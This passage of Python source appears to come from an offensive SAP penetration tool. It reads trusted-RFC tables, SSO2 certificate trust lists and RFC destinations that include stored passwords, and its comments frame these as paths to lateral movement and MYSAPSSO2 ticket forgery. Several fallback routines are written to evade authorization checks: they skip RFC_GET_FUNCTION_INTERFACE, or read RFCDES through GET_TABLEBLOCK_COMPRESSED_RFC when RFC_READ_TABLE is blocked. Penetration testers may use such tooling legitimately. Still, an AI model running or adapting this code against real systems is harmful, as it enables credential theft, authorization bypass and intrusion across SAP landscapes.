                conn_obj = _build_rfcdes_conn(
                    node, dest_name, rfctype, options)
                conn_obj.trusted_system = True
                conn_obj.trust_type = "trusted_rfc"
                trusted_conns.append(conn_obj)
                known_dests.add(dest_name)

    except Exception as e:
        logger.debug(f"Trusted-destination supplement failed for "
                     f"{node.sid}: {format_rfc_exception(e)}")

    if trusted_conns:
        print(f"[+] {node.sid}: Found {len(trusted_conns)} additional "
              f"trusted RFC destination(s) without stored password")
        existing.extend(trusted_conns)

    return existing


# ---------------------------------------------------------------------------
# Retrieve outbound trust table (RFCTRUST) — caller-side
# ---------------------------------------------------------------------------

def retrieve_rfctrust(node: SAPNode, creds: Credentials = None) -> list:
    """Read RFCTRUST to discover outbound trust relationships from this system.

    RFCTRUST stores which remote systems this node has established
    trusted RFC relationships with.  Each entry means: this system
    (RFCTRUSTSY) can make trusted RFC calls to the target system
    (RFCTRUSTID) using assertion tickets.

    Returns list of dicts with keys: rfctrustid, rfctrustsy,
    tlicense_nr, llicense_nr, rfcmsgsrv.
    """
    entries = []
    fields_to_read = [
        "RFCTRUSTID", "RFCTRUSTSY", "TLICENSE_NR",
        "LLICENSE_NR", "RFCMSGSRV",
    ]

    try:
        with _get_connection(node, creds) as conn:
            result = conn.call(
                RFC_READ_TABLE,
                QUERY_TABLE="RFCTRUST",
                DELIMITER="|",
                FIELDS=[{"FIELDNAME": f} for f in fields_to_read],
                ROWCOUNT=200,
            )
            data = result.get("DATA", [])
            for row in data:
                wa = row.get("WA", "")
                parts = [p.strip() for p in wa.split("|")]
                if len(parts) < 2:
                    continue
                entry = {
                    "rfctrustid":  parts[0] if len(parts) > 0 else "",
                    "rfctrustsy":  parts[1] if len(parts) > 1 else "",
                    "tlicense_nr": parts[2] if len(parts) > 2 else "",
                    "llicense_nr": parts[3] if len(parts) > 3 else "",
                    "rfcmsgsrv":   parts[4] if len(parts) > 4 else "",
                }
                entries.append(entry)

            if entries:
                targets = [e["rfctrustid"] for e in entries
                           if e["rfctrustid"]]
                print(f"[+] {node.sid}: RFCTRUST has {len(entries)} "
                      f"outbound trust entries → "
                      f"{', '.join(targets)}")
            else:
                print(f"[*] {node.sid}: RFCTRUST is empty — no "
                      f"outbound trusted-RFC relationships")

    except Exception as e:
        err = format_rfc_exception(e)
        if "NOT_AUTHORIZED" in err or "TABLE_WITHOUT_DATA" in err:
            logger.debug(f"RFCTRUST read on {node.sid}: {err}")
            print(f"[*] {node.sid}: RFCTRUST not readable "
                  f"(auth or empty)")
        else:
            logger.debug(f"RFCTRUST read failed on {node.sid}: {err}")
            print(f"[-] {node.sid}: Could not read RFCTRUST: "
                  f"{err[:80]}")

    return entries


# ---------------------------------------------------------------------------
# Retrieve inbound trusted-RFC ACL (RFCSYSACL)
# ---------------------------------------------------------------------------

def retrieve_rfcsysacl(node: SAPNode, creds: Credentials = None) -> list:
    """Read RFCSYSACL to discover which remote systems are trusted as
    inbound callers on this system.

    Returns list of dicts with keys: rfcsysid, rfcclient, rfcequser,
    rfcuser, rfcsnc, rfcsameusr.  Each entry means: the remote system
    (rfcsysid/rfcclient) is allowed to make trusted RFC calls into
    this system.  If rfcequser='Y', any user from the remote system
    maps to the same-named user here — the passwordless lateral
    movement case.
    """
    entries = []
    # Kernel-version-specific field set.  RFCSYSACL's columns vary:
    # kernel 720/730 lacks RFCEQUSER/RFCUSER/RFCSAMEUSR, while 754+
    # ships them all.  Ask FIRST for everything; on FIELD_NOT_VALID
    # (operator-reported NW 7.30 stack) probe the schema via
    # DDIF_FIELDINFO_GET and retry with the intersected list.
    fields_to_read = [
        "RFCSYSID", "RFCCLIENT", "RFCEQUSER",
        "RFCUSER", "RFCSNC", "RFCSAMEUSR",
    ]

    def _read_with_fields(fields):
        with _get_connection(node, creds) as conn:
            return conn.call(
                RFC_READ_TABLE,
                QUERY_TABLE="RFCSYSACL",
                DELIMITER="|",
                FIELDS=[{"FIELDNAME": f} for f in fields],
                ROWCOUNT=200,
            )

    def _probe_existing_fields(all_wanted):
        """Return the subset of ``all_wanted`` that exists on this
        kernel.  Uses DDIF_FIELDINFO_GET (metadata-only, cheap).
        Falls back to the input list on any error so the caller
        surfaces the original FIELD_NOT_VALID rather than a
        misleading schema-probe error.
        """
        try:
            cols = get_table_columns(node, "RFCSYSACL", creds=creds)
        except Exception:
            return all_wanted
        if not cols:
            return all_wanted
        available = {c.upper() for c in cols}
        return [f for f in all_wanted if f in available]

    try:
        try:
            result = _read_with_fields(fields_to_read)
        except Exception as e:
            err = format_rfc_exception(e)
            if "FIELD_NOT_VALID" not in err:
                raise
            # Older kernel — reduce the field list to what actually
            # exists on this system and retry.
            existing = _probe_existing_fields(fields_to_read)
            if not existing or existing == fields_to_read:
                # Probe didn't help (no schema access, or all fields
                # exist yet the call still errored).  Re-raise so the
                # outer handler logs the original error.
                raise
            print(f"[*] {node.sid}: RFCSYSACL kernel schema differs "
                  f"({len(fields_to_read) - len(existing)} field(s) "
                  f"missing) — retrying with "
                  f"{'/'.join(existing)}")
            fields_to_read = existing
            result = _read_with_fields(fields_to_read)

        # Build a column-name → row-index map so we can populate the
        # entry dict tolerantly (missing columns land as "").
        col_idx = {name.upper(): i
                   for i, name in enumerate(fields_to_read)}
        data = result.get("DATA", [])
        for row in data:
            wa = row.get("WA", "")
            parts = [p.strip() for p in wa.split("|")]
            def _col(name):
                i = col_idx.get(name)
                return parts[i] if i is not None and i < len(parts) else ""
            entries.append({
                "rfcsysid":  _col("RFCSYSID"),
                "rfcclient": _col("RFCCLIENT"),
                "rfcequser": _col("RFCEQUSER"),
                "rfcuser":   _col("RFCUSER"),
                "rfcsnc":    _col("RFCSNC"),
                "rfcsameusr":_col("RFCSAMEUSR"),
            })

        if entries:
            eq_y = sum(1 for e in entries if e["rfcequser"] == "Y")
            print(f"[+] {node.sid}: RFCSYSACL has {len(entries)} "
                  f"trusted-caller entries ({eq_y} with RFCEQUSER=Y)")
        else:
            print(f"[*] {node.sid}: RFCSYSACL is empty — no inbound "
                  f"trusted-RFC callers configured")

    except Exception as e:
        err = format_rfc_exception(e)
        if "NOT_AUTHORIZED" in err or "TABLE_WITHOUT_DATA" in err:
            logger.debug(f"RFCSYSACL read on {node.sid}: {err}")
            print(f"[*] {node.sid}: RFCSYSACL not readable "
                  f"(auth or empty)")
        else:
            logger.debug(f"RFCSYSACL read failed on {node.sid}: {err}")
            print(f"[-] {node.sid}: Could not read RFCSYSACL: "
                  f"{err[:80]}")

    return entries


# ---------------------------------------------------------------------------
# Retrieve STRUSTSSO2 trust list — which issuer PSEs this system trusts
# ---------------------------------------------------------------------------

def retrieve_strustsso2_trust_via_soap(node: SAPNode,
                                        soap_session) -> list:
    """SOAP-RFC variant of retrieve_strustsso2_trust for HTTP-only
    targets.

    Covers just the system-level trust tables (TWPSSO2ACL, USRSYSACL,
    TWPSSOAPLCT) — the ones that matter for ticket-forgery analysis.
    Skips DDIF_FIELDINFO_GET (no SOAP wrapper) and uses a static
    column list per known kernel.  User-level paths (USREXTID, USRACL)
    and the SSF FM probe are left out: they're intelligence-only and
    not worth a one-shot SOAP envelope for each.  Operator who wants
    them runs against a target with an open gateway.

    Same return shape as retrieve_strustsso2_trust so the GUI's
    trust-graph builder doesn't care which transport ran.
    """
    print(f"[*] {node.sid}: STRUSTSSO2 discovery via SOAP-RFC (system "
          f"trust tables only; user-level paths skipped)")
    entries = []
    seen_keys = set()

    # Static columns per kernel-version — DDIF discovery isn't
    # available over SOAP yet, so we hard-code the most common
    # signature shared by NW 7.40/7.50/7.54 + S/4 2020+.
    _SOAP_TRUST_TABLES = {
        "TWPSSO2ACL":  ["TRUSTSY", "TRUSTCL", "TRUSTSUBJ",
                         "TRUSTISS", "SERNO"],
        "USRSYSACL":   ["TRUSTSY", "TRUSTCL", "TRUSTSUBJ",
                         "TRUSTISS", "SERNO"],
        "TWPSSOAPLCT": ["TRUSTSY", "TRUSTCL", "TRUSTSUBJ",
                         "TRUSTISS", "SERNO"],
    }
    for tbl, fields in _SOAP_TRUST_TABLES.items():
        try:
            r = soap_session.read_table(
                tbl, fields=fields, max_rows=500)
        except Exception as e:
            print(f"[-] {node.sid}: {tbl} SOAP read raised: {e}")
            continue
        if not r.get("ok"):
            err = (r.get("error") or "")[:80]
            print(f"[*] {node.sid}: {tbl} not readable via SOAP "
                  f"({err}) — kernel may use different columns")
            continue
        rows = r.get("rows", [])
        if not rows:
            print(f"[*] {node.sid}: {tbl} is empty (0 rows)")
            continue
        print(f"[+] {node.sid}: {tbl} returned {len(rows)} row(s) "
              f"via SOAP")
        for row in rows:
            sysid   = (row.get("TRUSTSY", "") or "").strip()
            client  = (row.get("TRUSTCL", "") or "").strip()
            subject = (row.get("TRUSTSUBJ", "") or "").strip()
            issuer  = (row.get("TRUSTISS", "") or "").strip()
            serial  = (row.get("SERNO", "") or "").strip()
            if not (sysid or subject):
                continue
            key = ("strust", client, sysid, subject, serial)
            if key in seen_keys:
                continue
            seen_keys.add(key)
            entries.append({
                "issuer_sid": "", "issuer_client": "",
                "subject_dn": subject, "issuer_dn": issuer,
                "serial": serial, "source": tbl,
                "trusting_client": client, "kind": "system",
            })
    print(f"[+] {node.sid}: STRUSTSSO2 SOAP discovery — "
          f"{len(entries)} system-level entries")
    return entries


def retrieve_strustsso2_trust(node: SAPNode,
                              creds: Credentials = None) -> list:
    """Discover STRUSTSSO2 trust entries on this system.

    Two kinds of trust are surfaced — system-level (relevant for
    MYSAPSSO2 ticket forgery) and user-level (intelligence about
    external identity mappings).  The caller decides what to do
    with each by inspecting the ``source`` field.

    Discovery paths (all attempted; missing/empty/locked tables are
    skipped silently):

      1. **TWPSSO2ACL** — the actual STRUSTSSO2 SSO2 ACL table.
         Maps (trusted SYSID, trusted CLIENT) -> trusted cert
         subject.  This is the **system-level** trust table — the
         one that matters for ticket forgery.
      2. **USRSYSACL** — Workplace user→system ACL, populated on
         some kernels as a mirror of TWPSSO2ACL.
      3. **TWPSSOAPLCT** — older portal SSO2 ACL variant.
      4. **USREXTID** — external user identity mappings (X.509 DN,
         LDAP DN, SAML NameID, email) — **user-level**, useful for
         enumeration but NOT for ticket forgery.
      5. **USRACL** — X.509 user cert trust — **user-level**.
      6. ``SSF_C_GET_CERTIFICATE_LIST_OF_PSE`` FM — dumps the named
         PSE's trustbox.  Tries common SAPSYS applic names.

    Returns list of dicts: {issuer_sid, issuer_client, subject_dn,
    issuer_dn, serial, source, trusting_client, kind}.

    ``kind`` is "system" or "user".  Caller should cross-reference
    system-kind subject_dn against known SAPNode.sapsys_cert_subject_dn
    to resolve the issuer SID.
    """
    entries = []
    seen_keys = set()

    def _add(kind, source, **fields):
        subject = (fields.get("subject_dn") or "").strip()
        serial  = (fields.get("serial") or "").strip()
        client  = (fields.get("trusting_client") or "").strip()
        sysid   = (fields.get("issuer_sid") or "").strip()
        key = (source, client, sysid, subject, serial)
        if key in seen_keys:
            return
        seen_keys.add(key)
        entry = {
            "issuer_sid": "",
            "issuer_client": "",
            "subject_dn": "",
            "issuer_dn": "",
            "serial": "",
            "source": source,
            "trusting_client": "",
            "kind": kind,
        }
        entry.update({k: v for k, v in fields.items() if v is not None})
        entries.append(entry)

    # ---- Methods 1+2: System-trust tables with dynamic columns ----
    # Field names vary across NW kernel versions, so we discover
    # the actual column list via DDIF_FIELDINFO_GET and map by
    # substring match (TRUST*SY -> issuer_sid, *SUBJECT -> subject,
    # etc.).
    def _match_field(cols, *patterns):
        """Return first column matching any of the substring patterns."""
        cols_u = [c.upper() for c in cols]
        for pat in patterns:
            p = pat.upper()
            for i, c in enumerate(cols_u):
                if p in c:
                    return cols[i]
        return None

    for tbl in ("TWPSSO2ACL", "USRSYSACL", "TWPSSOAPLCT"):
        try:
            cols = get_table_columns(node, tbl, creds=creds)
        except Exception as e:
            logger.debug(f"{tbl} column discovery on {node.sid}: "
                         f"{format_rfc_exception(e)}")
            cols = []
        if not cols:
            print(f"[*] {node.sid}: table {tbl} not present "
                  f"(or no auth for DDIF_FIELDINFO_GET)")
            continue

        print(f"[*] {node.sid}: {tbl} columns: "
              f"{', '.join(cols[:20])}"
              f"{' …' if len(cols) > 20 else ''}")

        col_sysid   = _match_field(cols, "TRUSTSY", "RFCSYSID",
                                    "SYSID")
        col_client  = _match_field(cols, "TRUSTCL", "RFCCLIENT",
                                    "CLIENT", "MANDT")
        col_subject = _match_field(cols, "SUBJECT", "TRUSTSUBJ",
                                    "TRUSTPSE", "DN")
        col_issuer  = _match_field(cols, "ISSUER", "TRUSTISS")
        col_serial  = _match_field(cols, "SERIAL", "SERNO")

        fields_to_read = [f for f in (col_sysid, col_client,
                                       col_subject, col_issuer,
                                       col_serial) if f]
        if not fields_to_read:
            # No identifying columns matched our patterns; read ALL
            # columns (up to a row-width sane limit) so the user can
            # see what data the table holds.
            print(f"[*] {node.sid}: {tbl}: column patterns didn't "
                  f"match — reading ALL columns to expose raw data")
            fields_to_read = cols[:8]

        print(f"[*] {node.sid}: reading {tbl} with columns "
              f"{', '.join(fields_to_read)}")

        try:
            rows = read_table(node, tbl, fields=fields_to_read,
                              max_rows=500, creds=creds, quiet=True)
        except Exception as e:
            logger.debug(f"{tbl} read on {node.sid}: "
                         f"{format_rfc_exception(e)}")
            print(f"[-] {node.sid}: {tbl} read failed: "
                  f"{format_rfc_exception(e)[:80]}")
            continue

        if not rows:
            print(f"[*] {node.sid}: {tbl} is empty (0 rows)")
            continue

        print(f"[+] {node.sid}: {tbl} returned {len(rows)} row(s)")

        for r in rows:
            sysid   = (r.get(col_sysid)   if col_sysid   else "") or ""
            client  = (r.get(col_client)  if col_client  else "") or ""
            subject = (r.get(col_subject) if col_subject else "") or ""
            issuer  = (r.get(col_issuer)  if col_issuer  else "") or ""
            serial  = (r.get(col_serial)  if col_serial  else "") or ""
            sysid = sysid.strip()
            subject = subject.strip()
            # If neither identifying column matched but we have data,
            # surface the FIRST non-empty column value as subject_dn
            # so the operator can see something rather than silently
            # dropping the row.
            if not sysid and not subject:
                for c in fields_to_read:
                    v = (r.get(c) or "").strip()
                    if v and v not in ("000", "100", "001"):
                        subject = v
                        break
            if not sysid and not subject:
                continue
            _add("system", tbl,
                 issuer_sid=sysid, issuer_client=client.strip(),
                 subject_dn=subject, issuer_dn=issuer.strip(),
                 serial=serial.strip())

    # ---- Method 3: USREXTID — user-level identity mappings --------
    try:
        with _get_connection(node, creds) as conn:
            result = conn.call(
                RFC_READ_TABLE,
                QUERY_TABLE="USREXTID",
                DELIMITER="|",
                FIELDS=[
                    {"FIELDNAME": "MANDT"},
                    {"FIELDNAME": "TYPE"},
                    {"FIELDNAME": "EXTID"},
                    {"FIELDNAME": "BNAME"},
                ],
                ROWCOUNT=500,
            )
            for row in result.get("DATA", []):
                parts = [p.strip() for p in row.get("WA", "").split("|")]
                if len(parts) < 3:
                    continue
                client = parts[0]
                idtype = parts[1]
                extid  = parts[2]
                bname  = parts[3] if len(parts) > 3 else ""
                if not extid:
                    continue
                _add("user", f"USREXTID:{idtype}",
                     subject_dn=extid,
                     trusting_client=client,
                     issuer_dn=bname)
    except Exception as e:
        logger.debug(f"USREXTID read on {node.sid}: "
                     f"{format_rfc_exception(e)}")

    # ---- Method 4: USRACL — X.509 user cert trust -----------------
    try:
        with _get_connection(node, creds) as conn:
            result = conn.call(
                RFC_READ_TABLE,
                QUERY_TABLE="USRACL",
                DELIMITER="|",
                FIELDS=[
                    {"FIELDNAME": "MANDT"},
                    {"FIELDNAME": "BNAME"},
                    {"FIELDNAME": "SUBJECT"},
                    {"FIELDNAME": "ISSUER"},
                    {"FIELDNAME": "SERIALNO"},
                ],
                ROWCOUNT=500,
            )
            for row in result.get("DATA", []):
                parts = [p.strip() for p in row.get("WA", "").split("|")]
                if len(parts) < 4:
                    continue
                client  = parts[0]
                subject = parts[2] if len(parts) > 2 else ""
                issuer  = parts[3] if len(parts) > 3 else ""
                serial  = parts[4] if len(parts) > 4 else ""
                if not subject:
                    continue
                _add("user", "USRACL",
                     subject_dn=subject, issuer_dn=issuer,
                     serial=serial, trusting_client=client)
    except Exception as e:
        logger.debug(f"USRACL read on {node.sid}: "
                     f"{format_rfc_exception(e)}")

    # ---- Method 5: SSF FM trustbox dump ---------------------------
    # The System PSE trustbox is the authoritative source of which
    # signing certs this system accepts for SSO2 tickets.  On modern
    # S/4HANA the System PSE applic is "DFAULT"; older NW kernels
    # used "SYSPSEAPPLSRV".  Try a few; auth-gated on some systems.
    for applic in ("DFAULT", "SYS_PSE_DFAULT", "SYSPSEAPPLSRV",
                   "SAPSYS"):
        try:
            with _get_connection(node, creds) as conn:
                result = conn.call(
                    "SSF_C_GET_CERTIFICATE_LIST_OF_PSE",
                    STR_APPLIC=applic,
                )
                for cert in result.get("CERTIFICATELIST", []) or []:
                    if not isinstance(cert, dict):
                        continue
                    subject = (cert.get("SUBJECT") or "").strip()
                    issuer  = (cert.get("ISSUER") or "").strip()
                    serial  = (cert.get("SERIALNO") or "").strip()
                    if not subject:
                        continue
                    _add("system",
                         f"SSF_C_GET_CERTIFICATE_LIST_OF_PSE/{applic}",
                         subject_dn=subject, issuer_dn=issuer,
                         serial=serial)
        except Exception as e:
            logger.debug(
                f"SSF_C_GET_CERTIFICATE_LIST_OF_PSE({applic}) "
                f"on {node.sid}: {format_rfc_exception(e)}")

    sys_count = sum(1 for e in entries if e["kind"] == "system")
    usr_count = sum(1 for e in entries if e["kind"] == "user")
    if entries:
        sources = sorted({e["source"] for e in entries})
        print(f"[+] {node.sid}: STRUSTSSO2 discovery found "
              f"{sys_count} system-trust + {usr_count} user-identity "
              f"entries (sources: {', '.join(sources)})")
    else:
        print(f"[*] {node.sid}: No STRUSTSSO2 trust entries found "
              f"(no SSO2 trust configured or tables not readable)")

    return entries


def _parse_rsrfcchk_output(spool_lines: list, node: SAPNode) -> list:
    """Parse RSRFCCHK spool output into RFCConn objects."""
    connections = []

    for line in spool_lines:
        text = line.get("LINE", "") or line.get("WA", "") or str(line)
        # RSRFCCHK output format varies but typically contains:
        # Destination name, host, instance, client, user, connection type
        # Parse heuristically
        text = text.strip()
        if not text or text.startswith("*") or text.startswith("-"):
            continue

        # Try to extract type-3 connection info
        # Format typically: DESTNAME | HOST | INST | CLIENT | USER | TYPE
        parts = [p.strip() for p in text.split("|")]
        if len(parts) >= 4:
            dest_name = parts[0] if len(parts) > 0 else ""
            target_host = parts[1] if len(parts) > 1 else ""
            inst_nr = parts[2] if len(parts) > 2 else ""
            rfc_user = parts[3] if len(parts) > 3 else ""
            client = parts[4] if len(parts) > 4 else ""

            if dest_name:
                conn = RFCConn(
                    source_sid=node.sid,
                    source_host=node.hostname or node.ip,
                    target_host=target_host,
                    target_instance_nr=inst_nr,
                    destination_name=dest_name,
                    rfc_user=rfc_user,
                    client=client,
                )
                connections.append(conn)

    return connections


def _try_rfc_read_table_fallback(conn, node: SAPNode) -> list:
    """Fallback: read RFCDES for Type-3 / Type-G / Type-H destinations.

    Captures both password-authenticated and trusted (no stored password)
    Type-3 destinations.  Type-G/H still require %_PWD since trusted RFC
    is an ABAP-only mechanism.
    """
    print(f"[*] {node.sid}: Trying RFC_READ_TABLE fallback on RFCDES...")
    connections = []

    try:
        result = conn.call(
            RFC_READ_TABLE,
            QUERY_TABLE="RFCDES",
            DELIMITER="|",
            FIELDS=[
                {"FIELDNAME": "RFCDEST"},
                {"FIELDNAME": "RFCTYPE"},
                {"FIELDNAME": "RFCOPTIONS"},
            ],
            OPTIONS=[{"TEXT": _RFCDES_TYPE_FILTER}],
            ROWCOUNT=500,
        )

        data = result.get("DATA", [])
        for row in data:
            wa = row.get("WA", "")
            parts = wa.split("|")
            if len(parts) >= 2:
                dest_name = parts[0].strip()
                rfctype = parts[1].strip() if len(parts) > 1 else ""
                options = parts[2].strip() if len(parts) > 2 else ""

                has_pwd = "%_PWD" in options
                if not has_pwd and rfctype in ("G", "H"):
                    continue

                conn_obj = _build_rfcdes_conn(
                    node, dest_name, rfctype, options)
                # Trusted only if RFCOPTIONS has Q=Y (Type-3), NOT
                # merely "no stored password" — see _rfcdes_is_trusted.
                if _rfcdes_is_trusted(rfctype, options):
                    conn_obj.trusted_system = True
                    conn_obj.trust_type = "trusted_rfc"
                connections.append(conn_obj)

        n3 = sum(1 for c in connections if (c.conn_type or "rfc") == "rfc")
        n3_trusted = sum(1 for c in connections
                         if (c.conn_type or "rfc") == "rfc" and c.trusted_system)
        nh = len(connections) - n3
        parts = [f"{n3} Type-3"]
        if n3_trusted:
            parts.append(f"({n3_trusted} trusted)")
        parts.append(f"+ {nh} Type-G/H connections via RFCDES")
        print(f"[+] {node.sid}: Found {' '.join(parts)}")

    except Exception as e:
        logger.debug(f"RFCDES read failed: {format_rfc_exception(e)}")
        print(f"[-] {node.sid}: Could not read RFCDES table: {format_rfc_exception(e)}")

    return connections


def _try_rfcdes_raw_fallback(conn, node: SAPNode) -> list:
    """Fallback: read RFCDES via call_raw, bypassing RFC_GET_FUNCTION_INTERFACE.

    This helps when the user lacks S_RFC authorization for function group SRFC
    (RFC_GET_FUNCTION_INTERFACE) but does have authorization for SDTX
    (RFC_READ_TABLE).  The normal conn.call() always invokes
    RFC_GET_FUNCTION_INTERFACE first to fetch parameter metadata; call_raw
    skips that by supplying a hand-built function description.
    """
    print(f"[*] {node.sid}: Trying RFC_READ_TABLE via call_raw (bypass RFC_GET_FUNCTION_INTERFACE)...")
    connections = []

    try:
        # Build type descriptors for RFC_READ_TABLE's table parameters
        fields_td = conn._make_type_desc('RFC_DB_FLD', [
            ('FIELDNAME', RFCTYPE_CHAR, 30, 60),
            ('FIELDTEXT', RFCTYPE_CHAR, 60, 120),
            ('TYPE',      RFCTYPE_CHAR, 1,  2),
            ('LENGTH',    RFCTYPE_CHAR, 6,  12),
            ('OFFSET',    RFCTYPE_CHAR, 6,  12),
        ])
        options_td = conn._make_type_desc('RFC_DB_OPT', [
            ('TEXT', RFCTYPE_CHAR, 72, 144),
        ])
        data_td = conn._make_type_desc('TAB512', [
            ('WA', RFCTYPE_CHAR, 512, 1024),
        ])

        func_desc = conn._make_func_desc('RFC_READ_TABLE', [
            ('QUERY_TABLE', RFC_IMPORT, RFCTYPE_CHAR,  60,   30,  None),
            ('DELIMITER',   RFC_IMPORT, RFCTYPE_CHAR,  2,    1,   None),
            ('ROWCOUNT',    RFC_IMPORT, RFCTYPE_INT,   4,    4,   None),
            ('FIELDS',      RFC_TABLES, RFCTYPE_TABLE, 206,  103, fields_td),
            ('OPTIONS',     RFC_TABLES, RFCTYPE_TABLE, 144,  72,  options_td),
            ('DATA',        RFC_TABLES, RFCTYPE_TABLE, 1024, 512, data_td),
        ])

        result = conn.call_raw(
            'RFC_READ_TABLE', func_desc,
            QUERY_TABLE='RFCDES',
            DELIMITER='|',
            FIELDS=[
                {'FIELDNAME': 'RFCDEST'},
                {'FIELDNAME': 'RFCTYPE'},
                {'FIELDNAME': 'RFCOPTIONS'},
            ],
            OPTIONS=[{'TEXT': _RFCDES_TYPE_FILTER}],
            ROWCOUNT=500,
        )

        data = result.get("DATA", [])
        for row in data:
            wa = row.get("WA", "")
            parts = wa.split("|")
            if len(parts) >= 2:
                dest_name = parts[0].strip()
                rfctype = parts[1].strip() if len(parts) > 1 else ""
                options = parts[2].strip() if len(parts) > 2 else ""
                has_pwd = "%_PWD" in options
                if not has_pwd and rfctype in ("G", "H"):
                    continue
                conn_obj = _build_rfcdes_conn(
                    node, dest_name, rfctype, options)
                # Trusted only if RFCOPTIONS has Q=Y (Type-3) — see
                # _rfcdes_is_trusted for the rationale.
                if _rfcdes_is_trusted(rfctype, options):
                    conn_obj.trusted_system = True
                    conn_obj.trust_type = "trusted_rfc"
                connections.append(conn_obj)

        n3 = sum(1 for c in connections if (c.conn_type or "rfc") == "rfc")
        n3_trusted = sum(1 for c in connections
                         if (c.conn_type or "rfc") == "rfc" and c.trusted_system)
        nh = len(connections) - n3
        parts = [f"{n3} Type-3"]
        if n3_trusted:
            parts.append(f"({n3_trusted} trusted)")
        parts.append(f"+ {nh} Type-G/H connections via call_raw RFCDES")
        print(f"[+] {node.sid}: Found {' '.join(parts)}")

    except Exception as e:
        logger.debug(f"call_raw RFCDES failed: {format_rfc_exception(e)}")
        print(f"[-] {node.sid}: call_raw RFCDES fallback failed: {format_rfc_exception(e)}")

    return connections


def _try_tableblock_compressed_fallback(conn, node: SAPNode) -> list:
    """Fallback: read RFCDES via GET_TABLEBLOCK_COMPRESSED_RFC + SAP decompressor.

    This bypasses both RFC_GET_FUNCTION_INTERFACE and RFC_READ_TABLE
    authorization.  GET_TABLEBLOCK_COMPRESSED_RFC is often authorized
    for users with basic RFC access because it is used internally by
    SAP's own table comparison and distribution tools.

    The data comes back in SAP's proprietary LZH-compressed format
    inside BOX4096 table rows.  We decompress it with a small C helper
    built from the MaxDB/pysap GPL decompression library.
    """
    import os, subprocess, struct

    print(f"[*] {node.sid}: Trying GET_TABLEBLOCK_COMPRESSED_RFC on RFCDES ...")
    connections = []

    # File now lives in modules/discovery/; sap_decompress stays at project root.
    decompress_bin = os.path.join(os.path.dirname(__file__),
                                   "..", "..", "sap_decompress")
    if not os.path.isfile(decompress_bin):
        print(f"[-] {node.sid}: sap_decompress binary not found, skipping")
        return connections

    try:
        # -- build type / function descriptors -------------------------
        tbl256_td = conn._make_type_desc('TBL256', [
            ('LINE', RFCTYPE_BYTE, 256, 256),
        ])
        ntab_td = conn._make_type_desc('NTAB_CMP', [
            ('VIEWNAME',  RFCTYPE_CHAR, 30, 60),
            ('VARIANT',   RFCTYPE_CHAR, 14, 28),
            ('FIELDNAME', RFCTYPE_CHAR, 30, 60),
            ('TXTFIELD',  RFCTYPE_CHAR, 1,  2),
            ('FOFFSET',   RFCTYPE_NUM,  6,  12),
            ('INTLEN',    RFCTYPE_NUM,  6,  12),
            ('DECIMALS',  RFCTYPE_NUM,  6,  12),
            ('SIGN',      RFCTYPE_CHAR, 1,  2),
            ('INTTYPE',   RFCTYPE_CHAR, 1,  2),
            ('DATATYPE',  RFCTYPE_CHAR, 4,  8),
            ('DOMNAME',   RFCTYPE_CHAR, 30, 60),
            ('ROLLNAME',  RFCTYPE_CHAR, 30, 60),
            ('KEYFLAG',   RFCTYPE_CHAR, 1,  2),
            ('PRTFRKYFLD',RFCTYPE_CHAR, 1,  2),
            ('CLI_FIELD', RFCTYPE_CHAR, 1,  2),
            ('CHECKTABLE',RFCTYPE_CHAR, 30, 60),
            ('REFTABLE',  RFCTYPE_CHAR, 30, 60),
            ('REFFIELD',  RFCTYPE_CHAR, 30, 60),
            ('READONLY',  RFCTYPE_CHAR, 1,  2),
            ('FLAG',      RFCTYPE_CHAR, 1,  2),
            ('LANGU',     RFCTYPE_CHAR, 1,  2),
            ('OUTPUTLEN', RFCTYPE_NUM,  6,  12),
            ('CONVEXIT',  RFCTYPE_CHAR, 5,  10),
            ('FIELDTEXT', RFCTYPE_CHAR, 60, 120),
            ('REPTEXT',   RFCTYPE_CHAR, 55, 110),
            ('SCRTEXT_S', RFCTYPE_CHAR, 10, 20),
            ('SCRTEXT_M', RFCTYPE_CHAR, 20, 40),
            ('SCRTEXT_L', RFCTYPE_CHAR, 40, 80),
            ('TEXT',      RFCTYPE_CHAR, 55, 110),
            ('WIDTH',     RFCTYPE_NUM,  6,  12),
            ('WIDTH_CUST',RFCTYPE_NUM,  6,  12),
            ('NT_INDEX',  RFCTYPE_INT,  4,  4),
            ('CMP_FLAG',  RFCTYPE_CHAR, 2,  4),
            ('COMPARE',   RFCTYPE_CHAR, 1,  2),
            ('ADJUST',    RFCTYPE_CHAR, 1,  2),
            ('VISIBLE',   RFCTYPE_CHAR, 1,  2),
            ('FIELD_POS', RFCTYPE_NUM,  4,  8),
        ])
        ntab_nuc = (30+14+30+1+6+6+6+1+1+4+30+30+1+1+1+30+30+30
                    +1+1+1+6+5+60+55+10+20+40+55+6+6+4+2+1+1+1+4)
        ntab_uc  = (60+28+60+2+12+12+12+2+2+8+60+60+2+2+2+60+60+60
                    +2+2+2+12+10+120+110+20+40+80+110+12+12+4+4+2+2+2+8)

        func_desc = conn._make_func_desc('GET_TABLEBLOCK_COMPRESSED_RFC', [
            ('TABNAME',      RFC_IMPORT, RFCTYPE_CHAR,  60,      30,       None),
            ('GET_SYSTAB',   RFC_IMPORT, RFCTYPE_CHAR,  2,       1,        None),
            ('FIRST_KEY',    RFC_IMPORT, RFCTYPE_CHAR,  2,       1,        None),
            ('BLOCK_SIZE',   RFC_IMPORT, RFCTYPE_INT,   4,       4,        None),
            ('BOX4096',      RFC_TABLES, RFCTYPE_TABLE, 256,     256,      tbl256_td),
            ('NAME_TAB',     RFC_TABLES, RFCTYPE_TABLE, ntab_uc, ntab_nuc, ntab_td),
            ('NR_OF_ROWS',   RFC_EXPORT, RFCTYPE_INT,   4,       4,        None),
            ('TABLEN',       RFC_EXPORT, RFCTYPE_INT,   4,       4,        None),
            ('CHARLEN',      RFC_EXPORT, RFCTYPE_INT,   4,       4,        None),
            ('READY_FLAG',   RFC_EXPORT, RFCTYPE_CHAR,  2,       1,        None),
            ('CODE_PAGE',    RFC_EXPORT, RFCTYPE_NUM,   8,       4,        None),
            ('CHECK_NUMBER', RFC_EXPORT, RFCTYPE_NUM,   8,       4,        None),
            ('STRINGS',      RFC_EXPORT, RFCTYPE_CHAR,  2,       1,        None),
        ])

        # -- call the FM -----------------------------------------------
        result = conn.call_raw(
            'GET_TABLEBLOCK_COMPRESSED_RFC', func_desc,
            TABNAME='RFCDES', GET_SYSTAB='X', FIRST_KEY='X',
            BLOCK_SIZE=100000,
        )

        nr_rows = result.get('NR_OF_ROWS', 0)
        if nr_rows == 0:
            print(f"[*] {node.sid}: RFCDES returned 0 rows")
            return connections

